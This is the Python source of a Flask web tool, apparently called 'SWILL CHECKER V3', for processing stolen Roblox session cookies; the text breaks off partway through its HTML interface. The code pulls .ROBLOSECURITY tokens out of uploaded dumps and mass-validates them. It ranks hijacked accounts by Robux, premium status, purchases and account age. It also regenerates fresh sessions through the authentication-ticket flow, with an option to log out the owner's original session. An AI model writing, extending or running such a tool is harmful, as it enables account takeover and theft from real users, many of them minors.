import os
import time
import logging
import re
import urllib3
import json
import requests
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO

os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

def load_history(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return []

def save_history(fp, data):
    try:
        with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass

def add_checker_history(entry):
    h = load_history(CHECKER_HISTORY_FILE)
    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'type': entry.get('type','single'), 'total': entry.get('total',1), 'valid': entry.get('valid',0), 'cookies': entry.get('cookies',[])[:30], 'download_url': entry.get('download_url',''), 'full_data': entry.get('full_data', [])[:50]})
    if len(h) > 50: h = h[-50:]
    save_history(CHECKER_HISTORY_FILE, h)

def add_fresher_history(entry):
    h = load_history(FRESHER_HISTORY_FILE)
    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'mode': entry.get('mode','duplicate'), 'refreshed_count': entry.get('refreshed_count',0), 'success_count': entry.get('success_count',0), 'fail_count': entry.get('fail_count',0), 'cookies': entry.get('cookies',[])[:20]})
    if len(h) > 50: h = h[-50:]
    save_history(FRESHER_HISTORY_FILE, h)

def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_full_info(cookie):
    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']
        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except: return {}
        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True
        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass
        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')
        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 5:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.1)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass
        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,'is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY':c}, timeout=10, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
                uid = result['user_id']
                try:
                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
                except: pass
                try:
                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rd.status_code == 200:
                        cr = rd.json().get('created','')
                        if cr:
                            result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
                            result['created_ts'] = datetime.fromisoformat(cr.replace('Z','+00:00')).timestamp()
                except: pass
                try:
                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
                except: pass
                try:
                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if st.status_code == 200:
                        sec = st.json().get('MyAccountSecurityModel',{})
                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
                except: pass
                score = 0
                if result['robux'] >= 10000: score += 100
                elif result['robux'] >= 1000: score += 50
                elif result['robux'] >= 100: score += 25
                elif result['robux'] > 0: score += 10
                if result['is_premium']: score += 50
                if result['has_email']: score += 15
                if result['has_2fa']: score += 10
                if result['created_ts'] > 0:
                    age = (datetime.now().timestamp() - result['created_ts']) / 86400
                    if age > 365*3: score += 30
                    elif age > 365: score += 20
                result['score'] = score
    except: pass
    return result

# ===== УВЕЛИЧИЛИ ПОТОКИ С 10 ДО 20 =====
def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}"
    return "❌ НЕВАЛИД"

def merge_cookie_files(contents):
    all_cookies = set()
    for c in contents:
        for l in c.split('\n'):
            l = l.strip()
            if len(l)>20: all_cookies.add(l)
    return '\n'.join(sorted(all_cookies))

def split_cookies_by_count(content, count):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    if not cookies or count <= 0:
        return []
    files = []
    for i in range(0, len(cookies), count): files.append('\n'.join(cookies[i:i+count]))
    return files

def split_cookies_by_files(content, num):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    if not cookies or num <= 0:
        return []
    if num > len(cookies):
        num = len(cookies)
    per = len(cookies)//num; rem = len(cookies)%num
    files = []; idx = 0
    for i in range(num):
        end = idx+per+(1 if i<rem else 0)
        files.append('\n'.join(cookies[idx:end])); idx=end
    return files

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    return '\n'.join(list(dict.fromkeys(cookies)))

def clean_cookies(content):
    cookies = []
    for l in content.split('\n'):
        l = l.strip()
        if not l: continue
        if '.ROBLOSECURITY=' in l:
            val = l.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
            cookies.append(f'.ROBLOSECURITY={val}')
        elif len(l)>50 and not l.startswith('#'): cookies.append(l)
    return '\n'.join(cookies)

app = Flask(__name__)

# ===== НОВЫЙ ИНТЕРФЕЙС V3 =====
HTML = """<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SWILL CHECKER V3</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; min-height: 100vh; background: #0a0a12; color: #fff; overflow-x: hidden; }
        .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; background: radial-gradient(ellipse at 50% 0%, #1a0a2e 0%, #0a0a12 70%); overflow: hidden; }
        .bg-animation::before { content: ''; position: absolute; width: 600px; height: 600px; background: radial-gradient(circle, rgba(120, 50, 255, 0.15) 0%, transparent 70%); top: -200px; right: -200px; animation: floatBg 20s ease-in-out infinite alternate; }
        .bg-animation::after { content: ''; position: absolute; width: 500px; height: 500px; background: radial-gradient(circle, rgba(255, 50, 150, 0.10) 0%, transparent 70%); bottom: -200px; left: -200px; animation: floatBg 25s ease-in-out infinite alternate-reverse; }
        @keyframes floatBg { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(80px, 60px) scale(1.2); } }
        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden; }
        .particle { position: absolute; width: 2px; height: 2px; background: rgba(168, 85, 247, 0.4); border-radius: 50%; animation: particleFloat linear infinite; }
        @keyframes particleFloat { 0% { transform: translateY(100vh) scale(0); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-10vh) scale(1); opacity: 0; } }
        .wrapper { position: relative; z-index: 1; max-width: 1400px; margin: 0 auto; padding: 24px; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 28px; background: rgba(255, 255, 255, 0.04); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 20px; margin-bottom: 28px; flex-wrap: wrap; gap: 12px; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(135deg, #a855f7, #ec4899, #a855f7); background-size: 200% 200%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: gradientShift 4s ease-in-out infinite; }
        @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        .header-stats { display: flex; gap: 24px; align-items: center; flex-wrap: wrap; }
        .header-stat { text-align: center; padding: 4px 16px; }
        .header-stat .value { font-size: 22px; font-weight: 800; background: linear-gradient(135deg, #a855f7, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-stat .label { font-size: 10px; text-transform: uppercase; color: rgba(255, 255, 255, 0.4); letter-spacing: 1px; margin-top: 2px; }
        .header-stat .value.green { background: linear-gradient(135deg, #10b981, #34d399); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-stat .value.gold { background: linear-gradient(135deg, #f59e0b, #fbbf24); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-stat .value.blue { background: linear-gradient(135deg, #3b82f6, #60a5fa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 20px; padding: 28px 32px; margin-bottom: 24px; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); position: relative; overflow: hidden; }
        .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(135deg, rgba(168, 85, 247, 0.05), rgba(236, 72, 153, 0.02)); opacity: 0; transition: opacity 0.4s; }
        .card:hover::before { opacity: 1; }
        .card:hover { border-color: rgba(168, 85, 247, 0.2); transform: translateY(-2px); box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4); }
        .card h2 { font-size: 18px; font-weight: 700; margin-bottom: 16px; color: #fff; display: flex; align-items: center; gap: 10px; }
        .card h2 .badge { font-size: 10px; font-weight: 600; padding: 2px 10px; border-radius: 20px; background: rgba(168, 85, 247, 0.2); color: #a855f7; text-transform: uppercase; letter-spacing: 0.5px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
        @media (max-width: 900px) { .grid-2 { grid-template-columns: 1fr; } }
        textarea, .upload-area { width: 100%; padding: 14px 18px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 14px; color: #fff; font-family: 'Inter', monospace; font-size: 13px; resize: vertical; transition: all 0.3s; }
        textarea:focus { border-color: rgba(168, 85, 247, 0.4); outline: none; box-shadow: 0 0 30px rgba(168, 85, 247, 0.05); }
        .upload-area { min-height: 80px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; border-style: dashed; gap: 4px; text-align: center; transition: all 0.3s; }
        .upload-area:hover { border-color: rgba(168, 85, 247, 0.3); background: rgba(168, 85, 247, 0.03); }
        .btn { padding: 12px 28px; border: none; border-radius: 14px; font-size: 14px; font-weight: 700; color: #fff; cursor: pointer; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); display: inline-flex; align-items: center; gap: 8px; text-decoration: none; position: relative; overflow: hidden; }
        .btn::after { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255, 255, 255, 0.15); transform: translate(-50%, -50%); transition: width 0.6s, height 0.6s; }
        .btn:active::after { width: 300px; height: 300px; }
        .btn-primary { background: linear-gradient(135deg, #7c3aed, #a855f7); box-shadow: 0 4px 25px rgba(124, 58, 237, 0.3); }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 40px rgba(124, 58, 237, 0.4); }
        .btn-success { background: linear-gradient(135deg, #059669, #10b981); box-shadow: 0 4px 25px rgba(16, 185, 129, 0.3); }
        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 40px rgba(16, 185, 129, 0.4); }
        .btn-secondary { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.08); color: rgba(255, 255, 255, 0.6); }
        .btn-secondary:hover { background: rgba(255, 255, 255, 0.08); color: #fff; }
        .btn-danger { background: linear-gradient(135deg, #dc2626, #ef4444); box-shadow: 0 4px 25px rgba(220, 38, 38, 0.2); }
        .btn-sm { padding: 8px 16px; font-size: 11px; }
        .btn-xs { padding: 4px 12px; font-size: 10px; border-radius: 8px; }
        .btn-block { width: 100%; justify-content: center; }
        .mt-8 { margin-top: 8px; }
        .mt-12 { margin-top: 12px; }
        .mt-16 { margin-top: 16px; }
        .gap-8 { display: flex; gap: 8px; flex-wrap: wrap; }
        .gap-12 { display: flex; gap: 12px; flex-wrap: wrap; }
        .flex-row { display: flex; gap: 14px; flex-wrap: wrap; }
        .flex-1 { flex: 1; min-width: 200px; }
        .flex-2 { flex: 2; min-width: 250px; }
        .result-box { background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 14px; padding: 16px 18px; margin-top: 14px; max-height: 400px; overflow-y: auto; font-family: 'Inter', monospace; font-size: 12px; color: rgba(255, 255, 255, 0.8); white-space: pre-wrap; word-break: break-all; line-height: 1.6; }
        .result-box::-webkit-scrollbar { width: 4px; }
        .result-box::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); border-radius: 4px; }
        .result-box::-webkit-scrollbar-thumb { background: rgba(168, 85, 247, 0.3); border-radius: 4px; }
        .progress-bar { margin-top: 12px; background: rgba(255, 255, 255, 0.04); border-radius: 20px; height: 4px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #7c3aed, #ec4899); transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); border-radius: 20px; }
        .filter-bar { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 10px; }
        .filter-chip { padding: 4px 14px; border-radius: 20px; font-size: 11px; cursor: pointer; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.04); color: rgba(255, 255, 255, 0.4); transition: all 0.3s; user-select: none; }
        .filter-chip:hover { border-color: rgba(168, 85, 247, 0.2); color: #fff; }
        .filter-chip.active { background: rgba(168, 85, 247, 0.15); border-color: rgba(168, 85, 247, 0.3); color: #a855f7; }
        .history-item { background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 14px; padding: 14px 18px; margin-bottom: 10px; cursor: pointer; transition: all 0.3s; }
        .history-item:hover { border-color: rgba(168, 85, 247, 0.15); background: rgba(255, 255, 255, 0.03); }
        .history-item .hist-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
        .history-item .hist-detail { display: none; margin-top: 10px; padding-top: 10px; border-top: 1px solid rgba(255, 255, 255, 0.04); font-size: 11px; color: rgba(255, 255, 255, 0.5); max-height: 200px; overflow-y: auto; white-space: pre-wrap; }
        .history-item.open .hist-detail { display: block; }
        .empty-history { text-align: center; padding: 30px; color: rgba(255, 255, 255, 0.2); font-size: 13px; }
        .toggle-group { display: flex; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 3px; gap: 3px; margin-bottom: 14px; }
        .toggle-btn { flex: 1; padding: 10px 14px; background: transparent; border: none; border-radius: 10px; color: rgba(255, 255, 255, 0.4); font-size: 12px; font-weight: 600; cursor: pointer; text-align: center; transition: all 0.3s; }
        .toggle-btn.active { background: rgba(168, 85, 247, 0.15); color: #a855f7; }
        .toggle-btn:hover { color: #fff; }
        .tabs { display: flex; gap: 6px; margin-bottom: 28px; flex-wrap: wrap; }
        .tab { padding: 10px 24px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 14px; color: rgba(255, 255, 255, 0.3); cursor: pointer; font-size: 13px; font-weight: 600; transition: all 0.3s; }
        .tab:hover { border-color: rgba(168, 85, 247, 0.15); color: #fff; }
        .tab.active { background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.2); color: #a855f7; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .footer { text-align: center; padding: 24px 0 8px; color: rgba(255, 255, 255, 0.15); font-size: 12px; border-top: 1px solid rgba(255, 255, 255, 0.03); margin-top: 28px; }
        .log-line { color: rgba(255, 255, 255, 0.3); font-size: 11px; padding: 2px 0; }
        .text-muted { color: rgba(255, 255, 255, 0.3); font-size: 12px; }
        [data-theme="light"] body { background: #f0f0f5; color: #1a1a2e; }
        [data-theme="light"] .bg-animation { background: radial-gradient(ellipse at 50% 0%, #e8e0f0 0%, #f0f0f5 70%); }
        [data-theme="light"] .card { background: rgba(255, 255, 255, 0.8); border-color: rgba(0, 0, 0, 0.04); }
        [data-theme="light"] .card h2 { color: #1a1a2e; }
        [data-theme="light"] textarea, [data-theme="light"] .upload-area { background: rgba(0, 0, 0, 0.04); color: #1a1a2e; }
        [data-theme="light"] .result-box { background: rgba(0, 0, 0, 0.04); color: #1a1a2e; }
        [data-theme="light"] .header-stat .label { color: rgba(0, 0, 0, 0.3); }
        [data-theme="light"] .tab { color: rgba(0, 0, 0, 0.3); }
        [data-theme="light"] .tab.active { background: rgba(124, 58, 237, 0.08); border-color: rgba(124, 58, 237, 0.2); color: #7c3aed; }
        [data-theme="light"] .filter-chip { background: rgba(0, 0, 0, 0.02); color: rgba(0, 0, 0, 0.3); }
        [data-theme="light"] .filter-chip.active { background: rgba(124, 58, 237, 0.08); border-color: rgba(124, 58, 237, 0.2); color: #7c3aed; }
        [data-theme="light"] .history-item { background: rgba(0, 0, 0, 0.02); border-color: rgba(0, 0, 0, 0.04); }
        [data-theme="light"] .toggle-group { background: rgba(0, 0, 0, 0.04); }
        [data-theme="light"] .toggle-btn { color: rgba(0, 0, 0, 0.3); }
        [data-theme="light"] .toggle-btn.active { background: rgba(124, 58, 237, 0.08); color: #7c3aed; }
        [data-theme="light"] .header { background: rgba(255, 255, 255, 0.7); border-color: rgba(0, 0, 0, 0.04); }
        [data-theme="light"] .footer { color: rgba(0, 0, 0, 0.15); }
    </style>
</head>
<body>

<div class="bg-animation"></div>
<div class="particles" id="particles"></div>

<div class="wrapper">
    <header class="header">
        <div class="logo">✦ SWILL CHECKER</div>
        <div class="header-stats">
            <div class="header-stat"><div class="value" id="totalChecked">0</div><div class="label">Всего</div></div>
            <div class="header-stat"><div class="value green" id="validCount">0</div><div class="label">Валидные</div></div>
            <div class="header-stat"><div class="value gold" id="premiumCount">0</div><div class="label">Premium</div></div>
            <div class="header-stat"><div class="value blue" id="totalRobux">0</div><div class="label">Robux</div></div>
            <button class="btn btn-secondary btn-sm" onclick="toggleTheme()" style="margin-left:8px;">🌓</button>
        </div>
    </header>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="history">📜 История</div>
        <div class="tab" data-tab="tools">⚡ Инструменты</div>
    </div>

    <div class="tab-content active" id="tab-checker">
        <div class="grid-2">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН кук..." rows="3"></textarea>
                <button class="btn btn-primary mt-12 btn-block" onclick="runSingleCheck()">🔍 Проверить</button>
                <div class="result-box" id="singleResult">Ожидание...</div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка <span class="badge">20 потоков</span></h2>
                <div class="upload-area" id="massDropArea"><p>📁 <strong>Перетащите TXT файл</strong></p><p class="text-muted">или кликните для выбора</p></div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" class="text-muted" style="margin-top:6px;"></div>
                <div id="extractInfo" class="text-muted" style="display:none;color:#10b981;margin-top:4px;"></div>
                <button class="btn btn-success mt-12 btn-block" onclick="runMassCheck()">🚀 Запустить проверку</button>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                <div id="massLog" style="max-height:60px;overflow-y:auto;margin-top:6px;"></div>
                <div class="filter-bar mt-8" id="filterBar" style="display:none;">
                    <span class="filter-chip active" onclick="applyFilter('all', this)">Все</span>
                    <span class="filter-chip" onclick="applyFilter('premium', this)">💠 Premium</span>
                    <span class="filter-chip" onclick="applyFilter('rich', this)">💰 >1000 R$</span>
                    <span class="filter-chip" onclick="applyFilter('secure', this)">🔐 2FA</span>
                    <span class="filter-chip" onclick="applyFilter('old', this)">👴 >3 лет</span>
                </div>
                <div class="result-box" id="massResult">Результаты здесь...</div>
                <div id="massActions" style="display:none;" class="gap-8 mt-8">
                    <button class="btn btn-primary btn-sm" onclick="copyValidCookies()">📋 Копировать</button>
                    <button class="btn btn-secondary btn-sm" onclick="downloadValidOnly()">📥 Валидные</button>
                    <button class="btn btn-secondary btn-sm" onclick="downloadInvalidOnly()">📥 Невалидные</button>
                    <button class="btn btn-secondary btn-sm" onclick="downloadFullReport()">📊 Отчёт</button>
                </div>
                <div id="robuxCalc" style="display:none;margin-top:12px;padding:14px;background:rgba(0,0,0,0.2);border-radius:12px;font-size:13px;"></div>
            </div>
        </div>
    </div>

    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <div class="toggle-group">
                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <div class="flex-row">
                <div class="flex-2"><textarea id="fresherCookies" placeholder="Вставьте куки..." rows="6"></textarea></div>
                <div class="flex-1"><div class="upload-area" id="fresherDropArea"><p>📁 <strong>Перетащите .txt</strong></p></div><input type="file" id="fresherFile" accept=".txt" style="display:none;"></div>
            </div>
            <button class="btn btn-success mt-12 btn-block" onclick="runFresher()">⚡ Обновить</button>
            <div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
